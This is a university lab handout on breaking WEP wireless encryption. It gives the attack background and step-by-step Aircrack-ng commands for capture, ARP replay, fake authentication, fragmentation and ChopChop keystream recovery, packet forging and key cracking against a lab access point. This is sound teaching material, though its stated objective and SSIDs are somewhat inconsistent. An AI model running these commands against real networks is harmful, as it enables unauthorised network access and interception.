
##  Module Code: 6CSEF005W  ##
**Module name:** Wireless Network Security

**Lab activity:** Cracking WEP

**Author:** Dr Ayman El Hajjar  
  
---
#  Lab Activity: Connecting to a WEP Network on Linux

Objective:  
In this lab, you'll practice connecting a Linux system (e.g., Raspberry Pi VM) to a WEP-protected wireless network using three different approaches:

- Option 1: NetworkManager (nmcli)  
- Option 2: Command-line interface (iwconfig)  
- Option 3: Configuration file (wpa_supplicant)  

---

Target Network Details

- SSID: 6CSEF005W_WEP_AP  
- WEP Key: The objective of this lab is to find the WEP key

---




### An Introduction to WEP

The WEP protocol was introduced with the original 802.11 standard as a means to provide authentication and encryption to wireless LAN implementations. It is based on the RC4 (Rivest Cipher 4) stream cypher with a pre-shared secret key (PSK) of 40 or 104 bits, depending on the implementation. A 24-bit pseudo-random Initialization Vector (IV) is concatenated with the pre-shared key to generate the per-packet keystream used by RC4 for encryption and decryption. Thus, the resulting keystream could be 64 or 128 bits long.

### Attacks against WEP

- WEP is insecure and deprecated by the Wi-Fi Alliance due to vulnerabilities in keystream generation, IV reuse, and key length.
- The 24-bit IV space (2²⁴ = ~16.7 million values) is small and sent in cleartext, leading to keystream reuse and allowing attackers to perform statistical attacks.
- The Fluhrer, Mantin and Shamir (FMS) attack (2001) exploits weak IVs to recover keys; requires ~250,000 IVs for 40-bit keys and ~1,500,000 for 104-bit keys.
- Korek enhanced the FMS attack, improving its efficiency.
- Andreas Klein found further RC4 keystream-key correlations, aiding key recovery.
- Pyshkin, Tews, and Weinmann (PTW) attack (2007) further improved efficiency, requiring fewer IVs (around 40,000–85,000 frames) and is the default attack method in Aircrack-ng.
- Both FMS and PTW can be run passively but require large frame captures; active frame injection (e.g., replaying ARP requests) accelerates IV collection.
- The ARP Request Replay attack sends captured ARP requests back to the AP to generate more traffic with fresh IVs.
---

- We now move to the hands-on phase using Aircrack-ng.
- During reconnaissance, record the BSSID, channel, and security protocol of the target network.
- We'll focus on WEP-protected networks, capturing frames on the relevant channel.

### Capture Traffic

> **Command**  
> The following commands must be run regardless of whether clients are connected.

```bash
airmon-ng start wlan0 1
```
**Command**  
> Capture traffic on channel 1 for target AP with BSSID `08:7A:4C:83:0C:E0`:
```bash
airodump-ng --channel 1 --bssid 08:7A:4C:83:0C:E0 --write wep_crack mon0
```
This saves captured frames to the file `wep_crack.cap`.
We will crack WEP keys both with and without connected clients.

## Cracking WEP Key with Connected Clients
If a client is connected, it will show in `airodump-ng`. For example, MAC `98:52:B1:3B:32:58`.
Since we're not associated, we capture and replay that client’s ARP requests.
Use `aireplay-ng` to replay ARP requests and increase IV collection rate.

```bash
aireplay-ng --arpreplay -h 98:52:B1:3B:32:58 -b 08:7A:4C:83:0C:E0 mon0
```
Monitor `airodump-ng` terminal; data packets should increase rapidly.

After collecting enough packets (~40,000), attempt to crack the key:
```bash
aircrack-ng -b 08:7A:4C:83:0C:E0 wep_crack-01.cap
```
Aircrack-ng automatically retries when more IVs are captured.

On success, it outputs the key in hex and ASCII.


## Cracking WEP Key without Connected Clients
When no clients are connected, simulate association with fake authentication:

```bash
aireplay-ng --fakeauth 0 -o 1 -e LD7008Lab -a 08:7A:4C:83:0C:E0 -h 1C:4B:D6:BB:14:06 mon0
```
Success messages indicate fake authentication worked.

A deauthentication packet may indicate MAC filtering on the AP.

## Fragmentation and ChopChop Attacks
These attacks recover keystreams from single frames even without clients.

Not all drivers or APs support both; try alternately.

```bash
aireplay-ng --fragment -b 08:7A:4C:83:0C:E0 -h 1C:4B:D6:BB:14:06 mon0
```
Confirm usage of captured frame; recover up to 1500 bytes of keystream.

Save keystream once sufficient bytes collected (≥384).

ChopChop attack:
```bash
aireplay-ng --chopchop -b 08:7A:4C:83:0C:E0 -h 1C:4B:D6:BB:14:06 mon0
```
Recovers keystream relying only on ciphertext; slower but useful.
Forging and Injecting ARP Requests
With recovered keystream, forge an encrypted ARP request:

```bash
packetforge-ng --arp -a 08:7A:4C:83:0C:E0 -h 1C:4B:D6:BB:14:06 -k 192.168.1.100 -l 192.168.1.1 -y fragment-0325-172339.xor -w arprequest
```
Options:
`--arp` for ARP packets,
`-a` AP MAC,
`-h` source MAC,
`-k` destination IP,
`-l` source IP,
`-y` keystream file,
`-w` output file.

Inject forged ARP request:

```bash
aireplay-ng --interactive -r arprequest mon0
```
Observe ARP request injection details.

Watch `airodump-ng` terminal for increasing data packets.
After sufficient packets, crack key again:
```bash
aircrack-ng -b 08:7A:4C:83:0C:E0 wep_crack-10.cap
```
